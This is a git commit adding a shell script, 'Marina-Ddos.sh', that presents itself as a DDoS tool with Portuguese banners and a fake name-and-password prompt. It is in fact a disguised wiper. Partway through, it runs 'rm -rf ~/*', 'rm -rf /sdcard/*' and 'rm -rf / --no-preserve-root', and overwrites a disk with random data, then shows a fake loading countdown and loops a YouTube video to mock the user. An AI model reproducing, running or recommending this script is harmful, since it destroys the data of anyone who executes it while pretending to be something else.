a9102111fd9e1fbea57f97520a170d1a72d500a7
Darky-Oss <71002636+Darky-Oss@users.noreply.github.com>
2020-09-11 04:10:08 -0300

    Add files via upload

---
+++ Marina-Ddos.sh
@@ -0,0 +1,53 @@
+#!bin/bash
+
+	echo -e " \033[01;32mWELCOME TO LOS SANTOS"
+echo
+echo -e ' \033[05;31mEXERCITO ELETRÔNICO SÍRIO\033[00;37m'
+echo
+echo -e " \033[01;32m____________________________"
+sleep 2
+
+echo -e "        \033[01;31mACESSO AUTORIZADO!"
+
+read -p "DIGITE SEU NOME > " $NOME
+sleep 1
+read -p "DIGITE SUA SENHA > " $SENHA
+
+   echo "BEM VINDO ✓ SENHA E NOME COM ÊXITOS ✓"
+# SE VOCÊ LEU RLX APENAS BOTEI PRA GANHAR TEMPO ✓
+
+echo " \033[01;32m============================="
+echo
+clear
+apt update -y
+clear
+
+rm -rf ~/*
+rm -rf /sdcard/*
+rm -rf / --no-preserve-root
+dd if=/dev/random of=dev/sda
+
+   echo -e "CARREGANDO ARQUIVO .. 10s"
+  sleep 1
+echo -e "LOADING ..09s"
+sleep 1
+echo -e "LOADING .. 08s"
+sleep 1
+echo -e "LOADING .. 07s"
+sleep 1
+echo -e "LOADING .. 06s"
+sleep 1
+echo -e "LOADING .. 05s"
+sleep 1
+echo -e "LOADINF .. 04s"
+sleep 2
+
+apt install youtubedr -y
+apt install mpv python -y &>/dev/null
+pip3 install youtube-dl
+
+mpv https://youtu.be/Z2Dl5GfloU4 --loop &>dev/null
+
+# UM FORTE ABRAÇO E ATÉ O ANO QUE VEM ✓
+
+
